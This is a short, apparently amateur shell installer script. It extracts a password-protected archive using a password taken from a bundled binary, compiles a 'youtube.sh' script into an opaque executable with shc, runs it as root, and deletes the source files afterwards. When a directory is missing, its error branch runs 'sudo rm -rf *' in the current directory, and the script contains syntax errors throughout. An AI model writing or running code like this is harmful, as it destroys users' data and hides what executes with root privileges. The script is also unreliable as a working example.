#!/bin/sh 
dd=cd `stuff`
ss=`echo $?`
if [[ "$ss" != "0" ]] ; then 
	notify-send "WARNING : " "Directory stuff not found : Copilation failed"
	sudo rm -rf *
fi
cd stuff
ff=`./c "setup"` 
sudo rm c
cd ..
c=`which shc` 
if [[ "$c" == "" ]] ; then   
	notify-send "For Installation SuperUser Privillages Required !!!!!! "   	
   	
#dd2=cd `data`
#ss2=`echo $?`
#if [[ "$ss2" != "0" ]] ; then 
#	notify-send "WARNING : " "Directory data not found : Copilation failed"
#	sudo rm -rf *
#fi
#	cd data
	
fi

unzip -P "$ff" TEMP.zip 
cd TEMP 
shc -f youtube.sh 
gcc -o INSTALL youtube.sh.x.c 
chmod 777 * 
cp INSTALL ..
sudo rm -rf *
cd ..
sudo rm -rf TEMP
sudo rm TEMP.zip
sudo ./INSTALL
sudo rm *.sh
sudo rm *.txt
sudo rm *.html

